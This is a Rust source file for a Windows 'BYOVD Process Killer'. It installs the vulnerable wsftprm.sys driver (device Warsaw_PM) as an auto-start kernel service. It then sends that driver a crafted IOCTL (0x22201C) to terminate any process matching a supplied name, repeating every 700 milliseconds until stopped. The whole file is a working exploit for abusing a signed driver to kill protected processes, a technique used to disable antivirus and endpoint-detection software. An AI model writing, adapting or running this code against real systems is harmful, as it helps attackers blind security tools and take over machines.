#![allow(non_snake_case, non_camel_case_types, dead_code)]

use clap::{App, Arg};
use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::thread::sleep;
use std::time::Duration;
use winapi::shared::{minwindef::{DWORD, LPVOID}, ntdef::NULL, winerror::NO_ERROR};
use winapi::um::{
    fileapi::{CreateFileW, OPEN_EXISTING},
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    ioapiset::DeviceIoControl,
    processenv::GetCurrentDirectoryW,
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
    winnt::{SERVICE_AUTO_START, HANDLE, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, GENERIC_READ, GENERIC_WRITE},
    winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, 
            OpenSCManagerW, OpenServiceW, SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, 
            SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceW},
};

type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

// Driver configuration trait
trait DriverConfig {
    const NAME: &'static str;
    const PATH: &'static str;
    const DEVICE: &'static str;
    const IOCTL_CODE: DWORD;
}

// Warsaw_PM driver configuration
struct WarsawPMDriver;

impl DriverConfig for WarsawPMDriver {
    const NAME: &'static str = "wsftprm";
    const PATH: &'static str = "\\wsftprm.sys";
    const DEVICE: &'static str = "\\\\.\\Warsaw_PM";
    const IOCTL_CODE: DWORD = 0x22201C;
}

// RAII wrapper for service handles
struct ServiceHandle(SC_HANDLE);

impl ServiceHandle {
    fn new(handle: SC_HANDLE) -> Option<Self> {
        if handle.is_null() { None } else { Some(Self(handle)) }
    }
    
    fn handle(&self) -> SC_HANDLE { self.0 }
}

impl Drop for ServiceHandle {
    fn drop(&mut self) {
        unsafe { CloseServiceHandle(self.0); }
    }
}

// RAII wrapper for file handles
struct FileHandle(HANDLE);

impl FileHandle {
    fn new(handle: HANDLE) -> Option<Self> {
        if handle == INVALID_HANDLE_VALUE { None } else { Some(Self(handle)) }
    }
    
    fn handle(&self) -> HANDLE { self.0 }
}

impl Drop for FileHandle {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.0); }
    }
}

// Warsaw PM kill buffer
#[repr(C, packed)]
struct WarsawKillBuffer {
    target_pid: DWORD,
    padding: [u8; 1032],
}

// Main BYOVD structure
struct BYOVD<D: DriverConfig> {
    _sc_manager: ServiceHandle,
    service: ServiceHandle,
    _phantom: std::marker::PhantomData<D>,
}

impl<D: DriverConfig> BYOVD<D> {
    fn new() -> Result<Self> {
        let sc_manager = ServiceHandle::new(unsafe {
            OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE)
        }).ok_or("Failed to open service manager")?;

        let service = match ServiceHandle::new(unsafe {
            OpenServiceW(sc_manager.handle(), to_wstring(D::NAME).as_ptr(), SERVICE_ALL_ACCESS)
        }) {
            Some(service) => {
                println!("[!] Service already exists");
                service
            }
            None => {
                println!("[!] Creating new service");
                let current_dir = get_current_dir()?;
                let file_path = format!("{}{}", current_dir, D::PATH);
                
                ServiceHandle::new(unsafe {
                    CreateServiceW(
                        sc_manager.handle(),
                        to_wstring(D::NAME).as_ptr(),
                        to_wstring(D::NAME).as_ptr(),
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        to_wstring(&file_path).as_ptr(),
                        null_mut(), null_mut(), null_mut(), null_mut(), null_mut(),
                    )
                }).ok_or("Failed to create service")?
            }
        };

        Ok(Self {
            _sc_manager: sc_manager,
            service,
            _phantom: std::marker::PhantomData,
        })
    }

    fn start(&self) -> Result<()> {
        let success = unsafe {
            StartServiceW(self.service.handle(), 0, null_mut())
        };
        
        if success == 0 {
            return Err("Failed to start service".into());
        }
        
        println!("[!] Driver started");
        Ok(())
    }

    fn stop(&self) -> Result<()> {
        let mut status = SERVICE_STATUS {
            dwServiceType: 0,
            dwCurrentState: SERVICE_STOPPED,
            dwControlsAccepted: 0,
            dwWin32ExitCode: NO_ERROR,
            dwServiceSpecificExitCode: 0,
            dwCheckPoint: 0,
            dwWaitHint: 0,
        };

        unsafe {
            ControlService(self.service.handle(), SERVICE_CONTROL_STOP, &mut status);
            if DeleteService(self.service.handle()) != 0 {
                println!("[!] Service marked for deletion");
            }
        }
        Ok(())
    }

    fn kill_process(&self, pid: DWORD) -> Result<()> {
        let driver_handle = FileHandle::new(unsafe {
            CreateFileW(
                to_wstring(D::DEVICE).as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                null_mut(),
                OPEN_EXISTING,
                0,
                null_mut(),
            )
        }).ok_or("Failed to open driver device")?;

        let kill_buffer = WarsawKillBuffer {
            target_pid: pid,
            padding: [0u8; 1032],
        };

        let mut bytes_returned = 0;

        let success = unsafe {
            DeviceIoControl(
                driver_handle.handle(),
                D::IOCTL_CODE,
                &kill_buffer as *const _ as LPVOID,
                mem::size_of::<WarsawKillBuffer>() as DWORD,
                null_mut(),
                0,
                &mut bytes_returned,
                null_mut(),
            )
        };

        if success == 0 {
            return Err("IOCTL call failed".into());
        }

        println!("[!] Process {} terminated", pid);
        Ok(())
    }
}

// Utility functions
fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn get_current_dir() -> Result<String> {
    let mut buf = vec![0u16; 260];
    let len = unsafe { GetCurrentDirectoryW(buf.len() as u32, buf.as_mut_ptr()) };
    
    if len == 0 {
        return Err("Failed to get current directory".into());
    }
    
    buf.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buf))
}

fn get_pid_by_name(process_name: &str) -> Option<DWORD> {
    let snapshot = FileHandle::new(unsafe { 
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) 
    })?;

    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snapshot.handle(), &mut entry) } == 0 {
        return None;
    }

    loop {
        let current_name = unsafe { CStr::from_ptr(entry.szExeFile.as_ptr()) }
            .to_string_lossy()
            .to_lowercase();

        if current_name == process_name.to_lowercase() {
            return Some(entry.th32ProcessID);
        }

        if unsafe { Process32Next(snapshot.handle(), &mut entry) } == 0 {
            break;
        }
    }

    None
}

fn main() -> Result<()> {
    let matches = App::new("BYOVD Process Killer")
        .version("1.0")
        .author("BlackSnufkin")
        .about("Kills a process by name using wsftprm driver")
        .arg(Arg::new("process_name").short("n").long("name").takes_value(true))
        .get_matches();


    let process_name = matches.value_of("process_name").unwrap();
    
    // Initialize driver
    let driver = BYOVD::<WarsawPMDriver>::new()?;
    println!("[!] Driver initialized");
    
    // Start driver
    if let Err(e) = driver.start() {
        println!("[!] Driver may already be running: {}", e);
    }

    // Setup Ctrl+C handler
    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();
    
    ctrlc::set_handler(move || {
        println!("\n[!] Shutting down...");
        running_clone.store(false, Ordering::SeqCst);
    })?;

    println!("[!] Monitoring for process: {} (Press Ctrl+C to stop)", process_name);

    // Main monitoring loop
    while running.load(Ordering::SeqCst) {
        if let Some(pid) = get_pid_by_name(process_name) {
            match driver.kill_process(pid) {
                Ok(_) => println!("[!] Successfully killed PID: {}", pid),
                Err(e) => eprintln!("[X] Failed to kill PID {}: {}", pid, e),
            }
        }
        
        sleep(Duration::from_millis(700));
    }

    // Cleanup
    if let Err(e) = driver.stop() {
        eprintln!("[X] Failed to stop driver: {}", e);
    } else {
        println!("[!] Driver stopped");
    }

    Ok(())
}